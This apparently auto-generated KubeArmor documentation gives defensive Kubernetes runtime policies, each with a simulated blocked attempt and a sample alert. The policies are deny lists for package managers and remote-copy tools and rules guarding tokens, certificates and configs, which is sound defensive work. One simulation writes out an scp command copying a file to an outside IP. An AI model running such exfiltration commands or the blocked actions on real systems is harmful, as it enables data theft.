<!-- (This is an auto-generated file. Do not edit manually.) -->

# KubeArmor Use-Cases


<details><summary><h2>Service Account token: Protect access to k8s service account token</h2></summary>

### Description
K8s mounts the service account token as part of every pod by default. The service account token is a credential that can be used as a bearer token to access k8s APIs and gain access to other k8s entities. Many times there are no processes in the pod that use the service account tokens which means in such cases the k8s service account token is an unused asset that can be leveraged by the attacker.

### Attack Scenario
It's important to note that attackers often look for ways to gain access to other entities within Kubernetes clusters. One common method is to check for credential accesses, such as service account tokens, in order to perform lateral movements. For instance, in many Kubernetes attacks, once the attacker gains entry into a pod, they may attempt to use a service account token to access other entities. <br />  **Attack type** Credential Access, Comand Injection <br />  **Actual Attack** Hildegard, BlackT, BlackCat RaaS

### Compliance
- CIS_Kubernetes_Benchmark_v1.27, Control-Id-5.1.6

## Policy
### Service account token
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-wordpress-block-service-account
  namespace: wordpress-mysql
spec:
  severity: 2
  selector:
    matchLabels:
      app: wordpress
  file:
    matchDirectories:
      - dir: /run/secrets/kubernetes.io/serviceaccount/
        recursive: true
  action: Block
```
#### Simulation
```sh
root@wordpress-7c966b5d85-42jwx:/# cd /run/secrets/kubernetes.io/serviceaccount/ 
root@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# ls 
ls: cannot open directory .: Permission denied 
root@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# 
```

#### Expected Alert
```
{
  "ATags": null,
  "Action": "Block",
  "ClusterName": "deathiscoming",
  "ContainerID": "bbf968e6a75f0b4412478770911c6dd05d5a83ec97ca38872246e89c31e9d41a",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC",
  "Enforcer": "AppArmor",
  "HashID": "f1c272d8d75bdd91b9c4d1dc74c8d0f222bf4ecd0008c3a22a54706563ec5827",
  "HostName": "aditya",
  "HostPID": 11105,
  "HostPPID": 10997,
  "Labels": "app=wordpress",
  "Message": "",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "",
    "Namespace": "",
    "Ref": ""
  },
  "PID": 204,
  "PPID": 194,
  "PodName": "wordpress-7c966b5d85-42jwx",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/bin/ls",
  "Resource": "/run/secrets/kubernetes.io/serviceaccount",
  "Result": "Permission denied",
  "Severity": "",
  "Source": "/bin/ls",
  "Tags": "",
  "Timestamp": 1695903189,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-09-28T12:13:09.159252Z",
  "cluster_id": "3664",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

## References
[MITRE T1528: Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)<br />



</details>


<details><summary><h2>FIM: File Integrity Monitoring/Protection</h2></summary>

### Description
Changes to system binary folders, configuration paths, and credentials paths need to be monitored for change. With KubeArmor, one can not only monitor for changes but also block any write attempts in such system folders. Compliance frameworks such as PCI-DSS, NIST, and CIS expect FIM to be in place.

### Attack Scenario
In a possible attack scenario, an attacker may try to update the configuration to disable security controls or access logs. This can allow them to gain further access to the system and carry out malicious activities undetected. It's crucial to be aware of such threats and take proactive measures to prevent such attacks from occurring. <br /> **Attack Type** Data Manipulation, Integrity Threats<br /> **Actual Attack** NetWalker, Conti, DarkSide RaaS

### Compliance
- CIS Distribution Independent Linuxv2.0, Control-Id:6.3.5
- PCI-DSS, Requirement: 6
- PCI-DSS, Requirement: 10
- NIST_800-53_AU-2
- MITRE_T1565_data_manipulation

## Policy
### File Integrity Monitoring
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-file-integrity-monitoring
  namespace: wordpress-mysql
spec:
  action: Block
  file:
    matchDirectories:
    - dir: /sbin/
      readOnly: true
      recursive: true
    - dir: /usr/bin/
      readOnly: true
      recursive: true
    - dir: /usr/lib/
      readOnly: true
      recursive: true
    - dir: /usr/sbin/
      readOnly: true
      recursive: true
    - dir: /bin/
      readOnly: true
      recursive: true
    - dir: /boot/
      readOnly: true
      recursive: true
  message: Detected and prevented compromise to File integrity
  selector:
    matchLabels:
      app: mysql
  severity: 1
  tags:
  - NIST
  - NIST_800-53_AU-2
  - NIST_800-53_SI-4
  - MITRE
  - MITRE_T1036_masquerading
  - MITRE_T1565_data_manipulation
```
#### Simulation
```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd sbin
root@mysql-74775b4bf4-65nqf:/sbin# touch file
touch: cannot touch 'file': Permission denied
root@mysql-74775b4bf4-65nqf:/sbin# cd ..
```


### Expected Alert
```
{
  "ATags": [
    "NIST",
    "NIST_800-53_AU-2",
    "NIST_800-53_SI-4",
    "MITRE",
    "MITRE_T1036_masquerading",
    "MITRE_T1565_data_manipulation"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK",
  "Enforcer": "AppArmor",
  "HashID": "f0b220bfa3b7aeae754f3bf8a60dd1a0af001f5956ad22f625bdf83406a7fea3",
  "HostName": "aditya",
  "HostPID": 16462,
  "HostPPID": 16435,
  "Labels": "app=mysql",
  "Message": "Detected and prevented compromise to File integrity",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 167,
  "PPID": 160,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-file-integrity-monitoring",
  "ProcessName": "/bin/touch",
  "Resource": "/sbin/file",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/usr/bin/touch file",
  "Tags": "NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation",
  "Timestamp": 1696316210,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T06:56:50.829165Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

## References
[Mitre-Techniques-T1565](https://attack.mitre.org/techniques/T1565/)<br />[PCI DSS and FIM](https://pcidssguide.com/the-pci-dss-and-file-integrity-monitoring/)<br />[The biggest ransomware attacks in history](https://www.techtarget.com/searchsecurity/tip/The-biggest-ransomware-attacks-in-history)<br />



</details>


<details><summary><h2>Packaging tools: Deny execution of package management tools</h2></summary>

### Description
Pods/Containers might get shipped with binaries which should never used in the production environments. Some of those bins might be useful in dev/staging environments but the same container image is carried forward in most cases to the production environment too. For security reasons, the devsecops team might want to disable the use of these binaries in the production environment even though the bins exists in the container. As an example, most of the container images are shipped with package management tools such as apk, apt, yum, etc. If anyone ends up using these bins in the prod env, it will increase the attack surface of the container/pod.

### Attack Scenario
In an attack scenario, adversaries may use system tools such as fsck, ip, who, apt, and others for reconnaissance and to download additional tooling from remote servers. These tools can help them gain valuable information about the system and its vulnerabilities, allowing them to carry out further attacks. It's important to be vigilant about such activities and implement security measures to prevent such attacks from happening.<br /> **Attack Type** Command Injection, Malware, Backdoor<br /> **Actual Attack**  AppleJeus, Codecov supply chain

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id:6.4.5
- NIST_800-53_SI-4
- NIST_800-53_CM-7(4)

## Policy
### Packaging tools execution
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-pkg-mngr-exec
  namespace: wordpress-mysql
spec:
  action: Block
  message: Alert! Execution of package management process inside container is denied
  process:
    matchPaths:
    - path: /usr/bin/apt
    - path: /usr/bin/apt-get
    - path: /bin/apt-get
    - path: /sbin/apk
    - path: /bin/apt
    - path: /usr/bin/dpkg
    - path: /bin/dpkg
    - path: /usr/bin/gdebi
    - path: /bin/gdebi
    - path: /usr/bin/make
    - path: /bin/make
    - path: /usr/bin/yum
    - path: /bin/yum
    - path: /usr/bin/rpm
    - path: /bin/rpm
    - path: /usr/bin/dnf
    - path: /bin/dnf
    - path: /usr/bin/pacman
    - path: /usr/sbin/pacman
    - path: /bin/pacman
    - path: /sbin/pacman
    - path: /usr/bin/makepkg
    - path: /usr/sbin/makepkg
    - path: /bin/makepkg
    - path: /sbin/makepkg
    - path: /usr/bin/yaourt
    - path: /usr/sbin/yaourt
    - path: /bin/yaourt
    - path: /sbin/yaourt
    - path: /usr/bin/zypper
    - path: /bin/zypper
  selector:
    matchLabels:
      app: mysql
  severity: 5
  tags:
  - NIST
  - NIST_800-53_CM-7(4)
  - SI-4
  - process
  - NIST_800-53_SI-4
```
#### Simulation
```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# apt
bash: /usr/bin/apt: Permission denied
root@mysql-74775b4bf4-65nqf:/# apt-get
bash: /usr/bin/apt-get: Permission denied
```

#### Expected Alert
```
{
  "ATags": [
    "NIST",
    "NIST_800-53_CM-7(4)",
    "SI-4",
    "process",
    "NIST_800-53_SI-4"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HashID": "dd573c234f68b8df005e8cd314809c8b2a23852230d397743e348bf4a03ada3f",
  "HostName": "aditya",
  "HostPID": 21894,
  "HostPPID": 16435,
  "Labels": "app=mysql",
  "Message": "Alert! Execution of package management process inside container is denied",
  "NamespaceName": "wordpress-mysql",
  "Operation": "Process",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 168,
  "PPID": 160,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-pkg-mngr-exec",
  "ProcessName": "/usr/bin/apt",
  "Resource": "/usr/bin/apt",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4",
  "Timestamp": 1696318864,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T07:41:04.096412Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

## References
[MITRE Installer Packages](https://attack.mitre.org/techniques/T1546/016/)<br />[Codecov Incident - A Supply Chain Attack](https://blog.sonatype.com/what-you-need-to-know-about-the-codecov-incident-a-supply-chain-attack-gone-undetected-for-2-months)<br />



</details>


<details><summary><h2>Trusted certs bundle: Protect write access to the trusted root certificates bundle</h2></summary>

### Description
Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.

### Attack Scenario
By using this technique, attackers can successfully evade security warnings that alert users when compromised systems connect over HTTPS to adversary-controlled web servers. These servers often look like legitimate websites, and are designed to trick users into entering their login credentials, which can then be used by the attackers. It's important to be aware of this threat and take necessary precautions to prevent these attacks from happening.<br /> **Attack Type** Man-In-The-Middle(MITM)<br /> **Actual Attack**  POODLE(Padding Oracle On Downgraded Legacy Encryption), BEAST (Browser Exploit Against SSL/TLS)

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 6.3.4
- MITRE_T1552_unsecured_credentials

## Policy
### Trusted Certs Bundle
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-trusted-cert-mod
  namespace: wordpress-mysql
spec:
  action: Block
  file:
    matchDirectories:
    - dir: /etc/ssl/
      readOnly: true
      recursive: true
    - dir: /etc/pki/
      readOnly: true
      recursive: true
    - dir: /usr/local/share/ca-certificates/
      readOnly: true
      recursive: true
  message: Credentials modification denied
  selector:
    matchLabels:
      app: mysql
  severity: 1
  tags:
  - MITRE
  - MITRE_T1552_unsecured_credentials
  - FGT1555
  - FIGHT
```
#### Simulation
```sh
 kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd /etc/ssl/
root@mysql-74775b4bf4-65nqf:/etc/ssl# ls
certs
root@mysql-74775b4bf4-65nqf:/etc/ssl# rmdir certs
rmdir: failed to remove 'certs': Permission denied
root@mysql-74775b4bf4-65nqf:/etc/ssl# cd certs/
root@mysql-74775b4bf4-65nqf:/etc/ssl/certs# touch new
touch: cannot touch 'new': Permission denied
root@mysql-74775b4bf4-65nqf:/etc/ssl/certs#
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_RMDIR",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 24462,
  "HostPPID": 24411,
  "Labels": "app=mysql",
  "Message": "Credentials modification denied",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 185,
  "PPID": 179,
  "ParentProcessName": "/bin/bash",
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-trusted-cert-mod",
  "ProcessName": "/bin/rmdir",
  "Resource": "/etc/ssl/certs",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/rmdir certs",
  "Tags": "MITRE,MITRE_T1552_unsecured_credentials,FGT1555,FIGHT",
  "Timestamp": 1696320102,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-03T08:01:42.373810Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[MITRE Subvert Trust Controls](https://attack.mitre.org/techniques/T1553/004/)<br />[MITRE Unsecured credentials](https://attack.mitre.org/techniques/T1552/)<br />[POODLE Attack](https://www.acunetix.com/blog/web-security-zone/what-is-poodle-attack/)<br />[BEAST](https://docs.digicert.com/en/certcentral/certificate-tools/discovery-user-guide/tls-ssl-endpoint-vulnerabilities/beast.html#:~:text=In%20a%20BEAST%20attack%2C%20the,e.g.%2C%20HTTP%20authentication%20cookies).)<br />



</details>


<details><summary><h2>Database access: Protect read/write access to raw database tables from unknown processes.</h2></summary>

### Description
Applications use databases to store all the information such as posts, blogs, user information, etc. WordPress applications almost certainly use a MySQL database for storing their content, and those are usually stored elsewhere on the system, often /var/lib/mysql/some_db_name. 

### Attack Scenario
Adversaries have been known to use various techniques to steal information from databases. This information can include user credentials, posts, blogs, and more. By obtaining this information, adversaries can gain access to user accounts and potentially perform a full-account takeover, which can lead to further compromise of the target system. It's important to ensure that appropriate security measures are in place to protect against these types of attacks.<br /> **Attack Type** SQL Injection, Credential Access, Account Takeover<br /> **Actual Attack** Yahoo Voices Data Breach in 2012

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 6.14.4

## Policy
### Database Access
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-mysql-dir
  namespace: wordpress-mysql
spec:
  message: Alert! Attempt to make changes to database detected
  tags:
  - CIS
  - CIS_Linux
  selector:
    matchLabels:
      app: mysql
  file:
    matchDirectories:
    - dir: /var/lib/mysql/
      ownerOnly: true
      readOnly: true
      severity: 1
      action: Block
```
#### Simulation
```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd var/lib/mysql
root@mysql-74775b4bf4-65nqf:/var/lib/mysql# cat ib_logfile1
cat: ib_logfile1: Permission denied
root@mysql-74775b4bf4-65nqf:/var/lib/mysql#
```

#### Expected Alert
```
{
  "ATags": [
    "CIS",
    "CIS_Linux"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_OPEN flags=O_RDONLY",
  "Enforcer": "AppArmor",
  "HashID": "a7b7d91d52de395fe6cda698e89e0112e6f3ab818ea331cee60295a8ede358c8",
  "HostName": "aditya",
  "HostPID": 29898,
  "HostPPID": 29752,
  "Labels": "app=mysql",
  "Message": "Alert! Attempt to make changes to database detected",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 230,
  "PPID": 223,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "ksp-block-mysql-dir",
  "ProcessName": "/bin/cat",
  "Resource": "/var/lib/mysql/ib_logfile1",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/cat ib_logfile1",
  "Tags": "CIS,CIS_Linux",
  "Timestamp": 1696322555,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T08:42:35.618890Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

## References
[MITRE Scan Databases](https://attack.mitre.org/techniques/T1596/005/)<br />[Yahoo Service Hacked](https://arstechnica.com/information-technology/2012/07/yahoo-service-hacked/)<br />



</details>


<details><summary><h2>Config data: Protect access to configuration data containing plain text credentials.</h2></summary>

### Description
Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

### Attack Scenario
In a possible attack scenario, an attacker may try to change the configurations to open websites to application security holes such as session hijacking and cross-site scripting attacks, which can lead to the disclosure of private data. Additionally, attackers can also leverage these changes to gather sensitive information. It's crucial to take proactive measures to prevent these attacks from occurring.<br /> **Attack Type** Cross-Site Scripting(XSS), Data manipulation, Session hijacking<br /> **Actual Attack** XSS attack on Fortnite 2019, Turla LightNeuron Attack

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 6.16.14

## Policy
### Config data
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-stig-v-81883-restrict-access-to-config-files
  namespace: wordpress-mysql
spec:
  tags:
  - config-files
  message: Alert! configuration files have been accessed
  selector:
    matchLabels:
      app: wordpress
  file:
    matchPatterns:
    - pattern: /**/*.conf
      ownerOnly: true
  action: Block
```
#### Simulation

With a shell different than the user owning the file:
```sh
$ cat /etc/ca-certificates.conf                                                                                         
cat: /etc/ca-certificates.conf: Permission denied                                                                       
$                                                   
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPEN flags=O_RDONLY",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 39039,
  "HostPPID": 38787,
  "Labels": "app=wordpress",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 220,
  "PPID": 219,
  "ParentProcessName": "/bin/dash",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/bin/cat",
  "Resource": "/etc/ca-certificates.conf",
  "Result": "Permission denied",
  "Source": "/bin/cat /etc/ca-certificates.conf",
  "Timestamp": 1696485467,
  "Type": "MatchedPolicy",
  "UID": 1000,
  "UpdatedTime": "2023-10-05T05:57:47.935622Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[MITRE Unsecured credentials in files](https://attack.mitre.org/techniques/T1552/001/)<br />[Turla LightNeuron](https://www.welivesecurity.com/2019/05/07/turla-lightneuron-email-too-far/)<br />



</details>


<details><summary><h2>File Copy: Prevent file copy using standard utilities.</h2></summary>

### Description
Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

### Attack Scenario
It's important to note that file copy tools can be leveraged by attackers for exfiltrating sensitive data and transferring malicious payloads into the workloads. Additionally, it can also assist in lateral movement within the system. It's crucial to take proactive measures to prevent these attacks from occurring.<br /> **Attack Type** Credential Access, Lateral movements, Information Disclosure<br /> **Actual Attack** DarkBeam Data Breach, Shields Health Care Group data breach

### Compliance
- MITRE_TA0010_exfiltration
- NIST_800-53_SI-4(18)
- MITRE_TA0008_lateral_movement

## Policy
### File Copy
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-wordpress-remote-file-copy
  namespace: wordpress-mysql
spec:
  action: Block
  message: Alert! remote file copy tools execution prevented.
  process:
    matchPaths:
    - path: /usr/bin/rsync
    - path: /bin/rsync
    - path: /usr/bin/scp
    - path: /bin/scp
    - path: /usr/bin/scp
    - path: /bin/scp
  selector:
    matchLabels:
      app: wordpress
  severity: 5
  tags:
  - MITRE
  - MITRE_TA0008_lateral_movement
  - MITRE_TA0010_exfiltration
  - MITRE_TA0006_credential_access
  - MITRE_T1552_unsecured_credentials
  - NIST_800-53_SI-4(18)
  - NIST
  - NIST_800-53
  - NIST_800-53_SC-4
```
#### Simulation
```sh
root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              
bash: /usr/bin/scp: Permission denied                                                                                   
root@wordpress-fb448db97-wj7n7:/usr/bin#     
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 72178,
  "HostPPID": 30490,
  "Labels": "app=wordpress",
  "Message": "Alert! remote file copy tools execution prevented.",
  "NamespaceName": "wordpress-mysql",
  "Operation": "Process",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 259,
  "PPID": 193,
  "ParentProcessName": "/bin/bash",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "harden-wordpress-remote-file-copy",
  "ProcessName": "/usr/bin/scp",
  "Resource": "/usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4",
  "Timestamp": 1696487496,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T06:31:36.085860Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)<br />[Darkbeams data breach](https://www.idstrong.com/sentinel/darkbeams-alarming-data-breach/)<br />[Shields Healthcare Group Data Breach](https://www.idstrong.com/sentinel/shields-healthcare-group-data-breach/)<br />



</details>


<details><summary><h2>Network Access: Process based network access control</h2></summary>

### Description
Typically, within a pod/container, there are only specific processes that need to use network access. KubeArmor allows one to specify the set of binaries that are allowed to use network primitives such as TCP, UDP, and Raw sockets and deny everyone else.

### Attack Scenario
In a possible attack scenario, an attacker binary may attempt to send a beacon to its Command and Control (C&C) Server. Additionally, the binary may use network primitives to exfiltrate pod/container data and configuration. It's important to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper access controls and segmenting the network.<br /> **Attack Type** Denial of Service(DoS), Distributed Denial of Service(DDoS)<br /> **Actual Attack** DDoS attacks on websites of public institutions in Belgium, DDoS attack on the website of a city government in Germany

### Compliance
- Network Access

## Policy
### Network Access
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: restrict-proccess
  namespace: default
spec:
  severity: 4
  selector:
    matchLabels:
      app: nginx
  network:
    matchProtocols:
    - protocol: tcp
      fromSource:
      - path: /usr/bin/wget
    - protocol: udp
      fromSource:
      - path: /usr/bin/wget
  action:
    Allow
```
#### Simulation
Set the default security posture to default-deny

```sh
kubectl annotate ns default kubearmor-network-posture=block --overwrite
```

```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# curl www.google.com
curl: (6) Could not resolve host: www.google.com
root@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml
--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15051 (15K) [text/plain]
Saving to: 'wordpress-mysql-deployment.yaml.2'

wordpress-mysql-deployment.ya 100%[=================================================>]  14.70K  --.-KB/s    in 0.08s

2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_SOCKET",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 73952,
  "HostPPID": 73945,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "Network",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 532,
  "PPID": 525,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/curl",
  "Resource": "domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0",
  "Result": "Permission denied",
  "Source": "/usr/bin/curl www.google.com",
  "Timestamp": 1696588301,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T10:31:41.935146Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```





</details>


<details><summary><h2>/tmp/ noexec: Do not allow execution of binaries from /tmp/ folder.</h2></summary>

### Description
If provided the necessary privileges, users have the ability to install software in organizational information systems. To maintain control over the types of software installed, organizations identify permitted and prohibited actions regarding software installation. Prohibited software installations may include, for example, software with unknown or suspect pedigrees or software that organizations consider potentially malicious.

### Attack Scenario
In an attack scenario, a hacker may attempt to inject malicious scripts into the /tmp folder through a web application exploit. Once the script is uploaded, the attacker may try to execute it on the server in order to take it down. By hardening the /tmp folder, the attacker will not be able to execute the script, preventing such attacks. It's essential to implement these security measures to protect against these types of attacks and ensure the safety of the system.<br /> **Attack Type** System Failure, System Breach<br /> **Actual Attack** Shields Health Care Group data breach, MOVEit Breach

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 1.1.5
- Control-Id: 1.1.10

## Policy
### /tmp/ noexec
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-exec-inside-tmp
  namespace: wordpress-mysql
spec:
  tags:
  - CIS
  - CIS-control-1.1.5
  message: Alert! Execution attempted inside tmp folder
  selector:
    matchLabels:
      app: wordpress
  process:
    matchDirectories:
    - dir: /tmp/
      recursive: true
  action: Block
```
#### Simulation
```sh
